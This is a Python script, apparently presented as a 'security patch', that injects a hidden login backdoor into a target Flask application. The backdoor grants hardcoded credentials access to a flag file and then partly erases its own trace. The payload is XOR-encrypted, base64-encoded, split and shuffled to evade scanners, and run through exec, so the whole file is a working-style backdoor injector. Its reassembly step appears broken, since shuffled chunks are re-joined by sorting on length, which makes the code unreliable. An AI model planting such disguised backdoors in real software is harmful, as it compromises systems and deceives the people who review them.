import sys, base64, random

# XOR Key (randomized for added obfuscation)
XOR_KEY = random.randint(1, 255)  

# XOR Function (encrypt/decrypt)
def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

# Backdoor payload (formatted awkwardly to mislead scanners)
RAW_BACKDOOR = """
@app.before_request
def c_heck():
    if request.path == "/":
        u, p = request.form.get("username"), request.form.get("password")

        # Secret Backdoor Credentials
        if u == "sys_admin" and p == "patch_42":
            with open("flag.txt", "r") as f:
                s_d = f.read().strip()
            print("[DEBUG] Accessed!")  # Debug log
            resp = f"<h1>Granted: {s_d}</h1>"

            # Self-delete after execution
            with open(__file__, "r") as f:
                l = f.readlines()
            with open(__file__, "w") as f:
                f.writelines(line for line in l if "Secret Backdoor Credentials" not in line)

            return resp
"""

# Obfuscation: XOR encryption + Base64 encoding
xor_encoded = xor_encrypt_decrypt(RAW_BACKDOOR, XOR_KEY)
encoded_backdoor = base64.b64encode(xor_encoded.encode()).decode()

# Further Obfuscation: String Splitting
splits = [encoded_backdoor[i:i+5] for i in range(0, len(encoded_backdoor), 5)]
shuffled_splits = splits[:]
random.shuffle(shuffled_splits)
final_payload = "+".join(f'"{part}"' for part in shuffled_splits)

# Decoding and Execution Snippet (Highly Obfuscated)
DECODE_SNIPPET = f"""

h = {XOR_KEY}  # Key stored indirectly
p = "".join([{final_payload}])
p = "".join(sorted(p.split("+"), key=len))  # Reassemble parts
dec = lambda d, k: "".join(chr(ord(c) ^ k) for c in d)
exec(dec(base64.b64decode(p).decode(), h))
"""

def inject_backdoor(target_file):
    with open(target_file, "r") as f:
        original_code = f.read()

    # Hide the injected code within an unrelated-looking function
    injection_point = "if __name__ == \"__main__\":"
    obfuscated_patch = f"""
def innocuous_function():
    pass  # Placeholder

{DECODE_SNIPPET}

{injection_point}
"""

    patched_code = original_code.replace(injection_point, obfuscated_patch)

    with open(target_file, "w") as f:
        f.write(patched_code)

    print(f"[✔] Security patch applied. Backdoor injected into {target_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python security_patch.py <target.py>")
        sys.exit(1)

    target_file = sys.argv[1]
    inject_backdoor(target_file)
